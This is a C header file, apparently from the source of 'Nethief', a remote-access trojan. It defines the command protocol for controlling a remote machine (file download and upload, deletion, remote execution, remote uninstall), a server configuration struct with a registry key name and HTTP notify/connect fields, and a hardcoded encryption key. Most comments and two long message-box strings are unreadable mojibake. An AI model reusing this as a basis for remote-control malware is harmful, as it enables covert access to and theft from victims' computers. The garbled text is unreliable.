//Download by http://www.NewXing.com
///////////////////////////////////////////////////////////////////////////////
//
// STRUCTURE_DEFINE.h  --  �ṹ��������ͷ�ļ�
//
///////////////////////////////////////////////////////////////////////////////

#ifndef _INC_STRUCTURE_DEFINE
#define _INC_STRUCTURE_DEFINE

//*****************************************************************************
//TreeView���ڵ�����//////////////////////////////
#define TI_ROOT							0x00000001//���ڵ�"�ļ�������"
#define TI_HOST							0x00000002//�����ڵ�(�˽ڵ�������,����"�ҵĵ���"��Զ������)
#define TI_DISKDRIVE_REMOVABLE			0x00000004//����
#define TI_DISKDRIVE_FIXED				0x00000008//Ӳ�̼�����
#define TI_DISKDRIVE_CDROM				0x00000010//����
#define TI_ONCEEXPAND					0x00000020//�˽ڵ�����չ����
#define TI_DISKDRIVE					0x00000040//�˽ڵ��Ǵ���������
#define TI_CUT							0x00000080//�˽ڵ㱻����
#define TI_REMOTE						0x00000100//Զ�̽ڵ�(�˽ڵ�Ǳ���)
#define TI_ONCEACCESS					0x00000200//�������ʹ�(���ڱ�ʶԶ�������͹���)
//ListView�б�������///////////////////////////////
#define LI_FOUND						0XFFFFFFFF//���б�������Tree�б��ҵ�,����˵�������½����ļ���
//��ӳ���б��ͼ������/////////////////////////////
#define ICO_FILEMANAGER							0x00000000//�ļ�������
#define ICO_MYCOMPUTER							0x00000001//�ҵĵ���
#define ICO_FOLDER								0x00000002//�ļ���
#define ICO_FOLDER_OPEN							0x00000003//�ļ���(��״̬)
#define ICO_REMOTEHOST							0x00000004//Զ������
#define ICO_REMOTEHOST_DISCONNECT				0x00000005//Զ������(�Ͽ�����״̬)
#define ICO_REMOTEHOST_HTTPTUNNEL				0x00000006//Զ��HTTP�������
#define ICO_REMOTEHOST_HTTPTUNNEL_DISCONNECT	0x00000007//Զ��HTTP�������(�Ͽ�����״̬)
#define ICO_DRIVE_REMOVABLE						0x00000008//����������
#define ICO_DRIVE_FIXED							0x00000009//Ӳ��������
#define ICO_DRIVE_CDROM							0x0000000A//����������
#define ICO_DRIVE_ZIP							0x0000000B//ZIP������
#define ICO_DRIVE_REMOTE						0x0000000C//����������
//�Զ�����Ϣ///////////////////////////////////////
#define WM_SYSTRAY						WM_USER+100
#define WM_SOCKET						WM_USER+101
#define WM_WORKTHREAD					WM_USER+102
//�����߳�WPARAMֵ(���������������������)Ҳ������ֵ////
#define CMD_NOTIFYCONNECT				0x00000001
#define CMD_IDVERIFY					0x00000002
#define CMD_DOWNLOADDISKDRIVEINFO		0x00000003
#define CMD_EXPANDDIRECTORY				0x00000004
#define CMD_SHOWFILELIST				0x00000005
#define CMD_RENAMEFILE					0x00000006
#define CMD_NEWFILE						0x00000007
#define CMD_NEWFOLDER					0x00000008
#define CMD_DELETEFILE					0x00000009
#define CMD_REMOTEPASTE					0x00000010
#define CMD_GETOPERATIONOBJECT			0x00000011
#define CMD_DOWNLOADFILE				0x00000012
#define CMD_UPLOADFILE					0x00000013
#define CMD_SHOWPROPERTY_MULTI			0x00000014
#define CMD_SHOWPROPERTY_SINGLE			0x00000015
#define CMD_MODIFYPROPERTY_SINGLE		0x00000016
#define CMD_SHOWPROPERTY_DISKDRIVE		0x00000017
#define CMD_MODIFYPROPERTY_DISKDRIVE	0x00000018
#define CMD_REMOTERUN					0x00000019
#define CMD_REMOTEUNINSTALL				0x00000020
#define CMD_FINDFILE					0x00000021
#define CMD_SHOWNOTE					0x00000022
#define CMD_GETFILEINFO					0x00000023

#define OTR_REFRESHSTATUSBAR			0x00001001
//������������////////////////////////////////////
#define PROGRESS_RANGE					1000


//*****************************************************************************
#define PUBLICPASSWORD		"L*A|}t~k"			//���ڼ�����Կ����Կ
//��Ѱ�˵����Ϣ�������////////////////////////////
#define MESSAGEBOX_CAPTION	"д��ǰ��Ļ�"
#define MESSAGEBOX_TEXT		"\
    һֱ���������Ƕ���������ѵľ���Ϊ����ṩ�������������֪����\
����ԭ����Щ���������⵽ɱ�������׷ɱ�������Բ���֮��������ܶ��������ʵ�û������˲���\
���鷳���������ʱ�ᱻɱ�����ɱ�����޷�ʹ�á�\r\n\r\n    Ϊ�ˣ������ر��Ƴ��˲��ᱻɱ����\
����ɱ�ĸ��˰���������˰�������˲��ᱻɱ�������ɱ�⣬����������Ѱ����һ����Ҳ����˵��\
�Ѱ����ֻ�ǻᱻɱ�������ɱ����û���κι������ơ�\r\n\r\n    ���ǳ�ŵ���˰�����û�������\
�����ۺ����\r\n1���类��ɱ����Ѹ�������֤���ĸ��˰����ʼ�ղ��ᱻ��ɱ��\r\n2���������\
��������ǰ���°汾�ĸ��˰棺��֤��ʼ��ʹ�ñ���������°汾��\r\n\r\n    ���������ʹ�õ���\
���Ǵ�����������صģ�û��������֧���κη��ã���ô������Ѱ�������ܿ��ܻᱻɱ�������ɱ��\
��������ʹ�ñ����ʱ�����ɱ�������������������ֻҪ�رղ���ʵʱ��ؾͿ����ˣ�������ھ�\
�������������ţ� ��������ʹ�á�\r\n\r\n    ������빺����˰���������ѯ������ Sale.txt\
 �����ǵ���վ www.greenstuffsoft.net ��"

#define FILENOTFOUND_CAPTION	"���ɷ���˳���"
#define FILENOTFOUND_TEXT		"\
�޷��ҵ��ļ� Server.bud�����ļ������Ѿ���ɱ�����ɾ���ˡ���������ʹ�ñ����ʱ�ر�ɱ�������\
\r\n\r\n    һֱ���������Ƕ���������ѵľ���Ϊ����ṩ�������������֪����\
����ԭ����Щ���������⵽ɱ�������׷ɱ�������Բ���֮��������ܶ��������ʵ�û������˲���\
���鷳���������ʱ�ᱻɱ�����ɱ�����޷�ʹ�á�\r\n\r\n    Ϊ�ˣ������ر��Ƴ��˲��ᱻɱ����\
����ɱ�ĸ��˰���������˰�������˲��ᱻɱ�������ɱ�⣬����������Ѱ����һ����Ҳ����˵��\
�Ѱ����ֻ�ǻᱻɱ�������ɱ����û���κι������ơ�\r\n\r\n    ���ǳ�ŵ���˰�����û�������\
�����ۺ����\r\n1���类��ɱ����Ѹ�������֤���ĸ��˰����ʼ�ղ��ᱻ��ɱ��\r\n2���������\
��������ǰ���°汾�ĸ��˰棺��֤��ʼ��ʹ�ñ���������°汾��\r\n\r\n    ���������ʹ�õ���\
���Ǵ�����������صģ�û��������֧���κη��ã���ô������Ѱ�������ܿ��ܻᱻɱ�������ɱ��\
��������ʹ�ñ����ʱ�����ɱ�������������������ֻҪ�رղ���ʵʱ��ؾͿ����ˣ�������ھ�\
�������������ţ� ��������ʹ�á�\r\n\r\n    ������빺����˰���������ѯ������ Sale.txt\
 �����ǵ���վ www.greenstuffsoft.net ��"

//*****************************************************************************
//�ͻ��������˶�Ҫ�õ��Ľṹ����/////////////////
#pragma pack(1)

typedef struct		//�����������Ϣ
{
	char cHttpDirName[100];			//��������ļ���λ��
	char cNotifyFilename[50];
	char cConnectFilename[50];
	char cDownloadFilename[50];
	char cKeyName[25];				//ע��������������
	char cFilename[25];				//����˳�����ļ���
	char cNote[25];					//�����ע��
	BYTE byCheckSum[16];			//MD5У���
	char cDataPassword[50];			//���ݼ�����Կ
}
SERVER_CONFIG,*pSERVER_CONFIG;

typedef struct			//������ͨ����UDP���ݰ�
{
	BYTE byCheckSum[16];
	char cHostName[15];
	char cIPAddress[4];
	long lTotalMinutes;
}
SERVER_INFO,*pSERVER_INFO;

typedef struct		//�ͻ����ϴ�����ҳ�ռ�����ݣ����ڸ��߷���˿�ʼ����
{
	char cClientName[15];
	char cIPAddress[4];
}
CLIENT_CONNECT_INFO,*pCLIENT_CONNECT_INFO;

typedef struct
{
	BYTE byCheckSum[16];		//�����ļ���MD5У���
	char cDownloadFileURL[100];	//�����ļ���URL
}
DOWNLOAD_FILE_INFO,*pDOWNLOAD_FILE_INFO;
/////////////////////////////////////////////
typedef struct		//�����֤��Ϣ
{
	char cSoftwareName[14];	//���������,Ӧ��Ϊ:Nethief_Server
	char cHostName[15];		//����˵�������
}
RECV_IDVERIFY_INFO,*pRECV_IDVERIFY_INFO;

typedef struct		//��������Ϣ
{
	DWORD	dwType;			//����������
	char	cVolumeName[256];	//�������
}
RECV_DISKDRIVE_INFO,*pRECV_DISKDRIVE_INFO;

typedef struct
{
	int		nFileCount;
	int		nFolderCount;
	DWORD	dwTotalSize;
}
RECV_PROPERTYMULTI_INFO,*pRECV_PROPERTYMULTI_INFO;

typedef struct
{
	CTime	m_ctime;
	CTime	m_mtime;
	CTime	m_atime;
	LONG	m_size;
	BYTE	m_attribute;
	DWORD	dwFileType;
}
RECV_PROPERTYSINGLE_INFO,*pRECV_PROPERTYSINGLE_INFO;

typedef struct
{
	char		cVolumeName[11];
	DWORD		dwSerialNumber;
	DWORDLONG	dwlTotalNumberOfBytes;
	DWORDLONG	dwlTotalNumberOfUnusedBytes;
}
RECV_PROPERTYDISKDRIVE_INFO,*pRECV_PROPERTYDISKDRIVE_INFO;

typedef struct
{
	BOOL	bIsFileExist;
	LONG	m_size;
	CTime	m_mtime;
}
RECV_GETFILEINFO_INFO,*pRECV_GETFILEINFO_INFO;

typedef struct
{
	int		bmType;
	int		bmWidth;
	int		bmHeight;
	int		bmWidthBytes;
	BYTE	bmPlanes;
	BYTE	bmBitsPixel;
	DWORD	dwBitsCount;
}
RECV_BITMAP_INFO,*pRECV_BITMAP_INFO;

#pragma pack()
//*****************************************************************************

#endif	//_INC_STRUCTURE_DEFINE